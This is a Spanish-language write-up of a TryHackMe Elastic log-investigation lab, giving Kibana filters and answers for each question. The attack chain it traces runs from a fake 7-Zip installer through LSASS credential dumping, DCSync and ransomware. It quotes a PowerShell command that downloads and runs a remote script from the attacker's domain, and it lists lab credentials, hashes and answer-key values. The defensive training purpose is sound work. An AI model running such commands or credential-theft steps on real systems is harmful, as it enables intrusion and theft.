- --
- Tags: #elasticsearch 
- --
**TRYACKME**
### 🎯 **Objetivos completados del laboratorio
1. **Descarga inicial del software malicioso (vector de entrada)**  
    El usuario víctima descargó el instalador malicioso desde  
    **`http://www.7zipp.org/a/7z2301-x64.msi`**, simulando ser software legítimo (técnica de _masquerading_).
2. **Resolución del dominio malicioso**  
    El dominio **7zipp.org** resolvió a la dirección IP **`206.189.34.218`**, identificando la infraestructura del atacante.
3. **Ejecución del instalador malicioso**  
    El archivo **`7z2301-x64.msi`** fue ejecutado con **PID 2532**, iniciando la cadena de compromiso.
4. **Ejecución remota de código mediante PowerShell**  
    El instalador descargó y ejecutó un script remoto usando PowerShell:  
    **`powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`**, técnica típica de _living off the land_ (LOLBins).
5. **Instalación encubierta de software legítimo**  
    El script también descargó e instaló la versión legítima de la aplicación en  
    **`C:\Windows\Temp\7zlegit.exe`**, para reducir sospechas del usuario.
6. **Persistencia mediante servicio del sistema**  
    Se creó el servicio **`7zService`**, asegurando persistencia tras reinicios.
7. **Ejecución del servicio con privilegios elevados**  
    El servicio se ejecutó bajo la cuenta **SYSTEM**, otorgando control total del sistema al atacante.
8. **Volcado de credenciales desde LSASS**  
    El atacante utilizó el script **`Invoke-PowerExtract`** para analizar los datos obtenidos del proceso LSASS.
9. **Obtención de credenciales mediante Mimikatz**  
    Se recuperó el par de credenciales:  
    **`james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF`**.
10. **Movimiento lateral y manipulación de cuentas**  
    Tras usar las credenciales obtenidas, el atacante restableció la contraseña de otra cuenta a  
    **`pwn3dpw!!!`**, usando herramientas nativas (_net1_).
11. **Acceso a nueva estación de trabajo**  
    La nueva cuenta fue utilizada en la estación **`WKSTN-02`**, confirmando movimiento lateral.
12. **Descubrimiento de nuevas credenciales privilegiadas**  
    En la nueva estación se obtuvieron las credenciales:  
    **`SSF\itadmin:NoO6@39Sk0!`**.
13. **Volcado de credenciales del administrador de dominio**  
    Además de Mimikatz, se utilizó el script **`Invoke-SharpKatz.ps1`** para extraer hashes privilegiados.
14. **Obtención del hash AES256 del administrador de dominio**  
    Se identificó el hash AES256:  
    **`f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534`**, confirmando compromiso total del dominio.
15. **Impacto final: despliegue de ransomware**  
    Tras obtener privilegios de administrador de dominio, el atacante ejecutó ransomware (**`bomb.exe`**), cifrando **46 archivos** en todas las estaciones de trabajo.

----
*Pregunta 1*
¿Cuál es la URL del software malicioso que ha descargado el usuario víctima?
Filtro: `process.name: chrome.exe AND *zip*`
![Pasted image 20260114133944](../Fotos/Pasted%20image%2020260114133944.png)
Respuesta: http://www.7zipp.org/a/7z2301-x64.msi

*Pregunta 2*
¿Cuál es la dirección IP del dominio que aloja el malware?
Filtro: `*7zipp*`
Columna: `dns.resolved_ip`
![Pasted image 20260114134329](../Fotos/Pasted%20image%2020260114134329.png)
Respuesta: 206.189.34.218

*Pregunta 3*
¿Cuál es el PID del proceso que ejecutó el software malicioso?
Filtro: 7z2301-x64.msi
Columna: `process.parent.name` `process.name` `file.name` `process.pid`
![Pasted image 20260114135303](../Fotos/Pasted%20image%2020260114135303.png)
Respuesta: 2532

*Pregunta 4*
Tras la cadena de ejecución de la carga maliciosa, se descargaba y ejecutaba otro archivo remoto. ¿Cuál es el valor completo de línea de comandos de esta actividad sospechosa?
Filtro: `event.code:1 AND 7z.ps1`
Columna: `process.command_line` `message`
![Pasted image 20260114141540](../Fotos/Pasted%20image%2020260114141540.png)
Resultado: powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)

*Pregunta 5*
El script recién descargado también instaló la versión legítima de la aplicación. ¿Cuál es la ruta completa del archivo del instalador legítimo?
Filtro: `vent.code:1 AND 7z.ps1`
![Pasted image 20260114141920](../Fotos/Pasted%20image%2020260114141920.png)
Resultado: C:\Windows\Temp\7zlegit.exe

*Pregunta 6*
¿Cuál es el nombre del servicio que se instaló?
Filtro: `vent.code:1 AND 7z.ps1`
Columna: `user.name`
![Pasted image 20260114144701](../Fotos/Pasted%20image%2020260114144701.png)
Resultado: 7zService
![700](../Fotos/Pasted%20image%2020260319110509.png)![Pasted image 20260319110754](../Fotos/Pasted%20image%2020260319110754.png)
![Pasted image 20260319110903](../Fotos/Pasted%20image%2020260319110903.png) ![Pasted image 20260319110936](../Fotos/Pasted%20image%2020260319110936.png)
![Pasted image 20260319111047](../Fotos/Pasted%20image%2020260319111047.png)

*Pregunta 7*
El atacante pudo establecer una conexión C2 tras iniciar el servicio implantado. ¿Cuál es el nombre de usuario de la cuenta que ejecutó el servicio?
![Pasted image 20260114145401](../Fotos/Pasted%20image%2020260114145401.png)
Resultado: SYSTEM

*Pregunta 8*
Tras volcar los datos de LSASS, el atacante intentaba analizar los datos para obtener las credenciales. ¿Cuál es el nombre de la herramienta que utiliza el atacante en esta actividad?
Filtro: `event.code:1 AND Invoke-Nanodump.ps1`
![Pasted image 20260114151259](../Fotos/Pasted%20image%2020260114151259.png)
Respuesta: Invoke-PowerExtract
![Pasted image 20260319120703](../Fotos/Pasted%20image%2020260319120703.png) ![Pasted image 20260319120601](../Fotos/Pasted%20image%2020260319120601.png)

*Pregunta 9*
¿Cuál es el par de credenciales que el atacante utilizó tras la actividad de dumping de credenciales?
Filtro: `event.code:1 AND mimikatz*`
![Pasted image 20260114154825](../Fotos/Pasted%20image%2020260114154825.png)
Resultado: james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF
![Pasted image 20260319132112](../Fotos/Pasted%20image%2020260319132112.png) ![Pasted image 20260319132120](../Fotos/Pasted%20image%2020260319132120.png)

*Pregunta 10*
Tras acceder a la nueva cuenta, el atacante intentó restablecer las credenciales de otro usuario. ¿Cuál es la nueva contraseña establecida para esta cuenta objetivo?
Filtro: `event.code:1 AND *net1`
![Pasted image 20260114160021](../Fotos/Pasted%20image%2020260114160021.png)
Resultado: pwn3dpw!!!
![Pasted image 20260319140013](../Fotos/Pasted%20image%2020260319140013.png)
![Pasted image 20260319140121](../Fotos/Pasted%20image%2020260319140121.png) ![Pasted image 20260319140154](../Fotos/Pasted%20image%2020260319140154.png)
![Pasted image 20260319140347](../Fotos/Pasted%20image%2020260319140347.png)
![Pasted image 20260319140400](../Fotos/Pasted%20image%2020260319140400.png)

*Pregunta 11*
¿Cómo se llama la estación de trabajo donde se usó la nueva cuenta?
Columna: `agent.hostname`
![Pasted image 20260114160350](../Fotos/Pasted%20image%2020260114160350.png)
Resultado: WKSTN-02

*Pregunta 12*
Tras acceder a la nueva estación de trabajo, se descubrió un nuevo conjunto de credenciales. ¿Cuál es el nombre de usuario, incluyendo su dominio, y la contraseña de esta nueva cuenta?
Filtro: `event.code:1 AND anna.jones` 
![Pasted image 20260114161745](../Fotos/Pasted%20image%2020260114161745.png)
Resumen: SSF\itadmin:NoO6@39Sk0!
*Lo que vemos en el process.command.line es que el atacante en este caso como anna jones esta haciendo uso de estas credenciales hayadas probablemente en algun archivo y utilizadas para descargar powerview.ps1 para seguir enumerando*

**En resumen, la línea completa significa:**
"Usa la contraseña robada de **itadmin**, descarga una herramienta de hacking de internet sin dejar rastro en el disco, y dale a **Anna Jones** (mi cuenta de ataque) permisos totales sobre el Active Directory".
![Pasted image 20260319144257](../Fotos/Pasted%20image%2020260319144257.png) ![Pasted image 20260319144520](../Fotos/Pasted%20image%2020260319144520.png)
![Pasted image 20260319144540](../Fotos/Pasted%20image%2020260319144540.png)
![Pasted image 20260319144831](../Fotos/Pasted%20image%2020260319144831.png)
![Pasted image 20260319144846](../Fotos/Pasted%20image%2020260319144846.png)
*La idea aqui es dar los permisos de itadmin a anna.jones para tener los privilegios pero de manera mas silenciosa*
![Pasted image 20260319145259](../Fotos/Pasted%20image%2020260319145259.png)

*Pregunta 13*
Aparte de mimikatz, ¿cómo se llama el script de PowerShell que se usa para volcar el hash del administrador del dominio?
Filtro: `event.code:1 AND anna.jones`
![Pasted image 20260114162114](../Fotos/Pasted%20image%2020260114162114.png)
Resultado: Invoke-SharpKatz.ps1
*Ahora que Anna es poderosa, usa **SharpKatz** y **DCSync** para pedirle al servidor la contraseña de **Damian Hall**.*
![Pasted image 20260319171534](../Fotos/Pasted%20image%2020260319171534.png) ![Pasted image 20260319172459](../Fotos/Pasted%20image%2020260319172459.png)

*Pregunta 14*
¿Cuál es el hash AES256 del administrador del dominio basado en la salida de volcado de credenciales?
Filtro: `process.command_line:*eb1892cb0a163e122bc71be173c66fed*`
![Pasted image 20260114163625](../Fotos/Pasted%20image%2020260114163625.png)
En uno de los eventos hay que entrar en `surround documents` y ampliar el filtro a unos 15 mas o menos y encontrar esta vista y desplegar el `message`
![Pasted image 20260114164347](../Fotos/Pasted%20image%2020260114164347.png)
Resultado: f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534
*Golden Ticket*
![Pasted image 20260319173633](../Fotos/Pasted%20image%2020260319173633.png) ![Pasted image 20260319173706](../Fotos/Pasted%20image%2020260319173706.png)

*Pregunta 15*
Tras obtener acceso de administrador de dominio, el atacante activó ransomware en las estaciones de trabajo. ¿Cuántos archivos estaban cifrados en todas las estaciones de trabajo?
Filtro: `process.name: *bomb.exe* AND event.code: 11`
![Pasted image 20260114165314](../Fotos/Pasted%20image%2020260114165314.png)
Respuesta: 46
*El filtro dice `46 hits`. Eso es porque el analista ya filtró por `event.code: 11` (creación de archivo). Cada "hit" es un archivo nuevo (cifrado) que el ransomware creó.*

**En blackbox deberiamos:**
![Pasted image 20260319174344](../Fotos/Pasted%20image%2020260319174344.png) ![Pasted image 20260319174405](../Fotos/Pasted%20image%2020260319174405.png)
![Pasted image 20260319174444](../Fotos/Pasted%20image%2020260319174444.png) ![Pasted image 20260319174517](../Fotos/Pasted%20image%2020260319174517.png)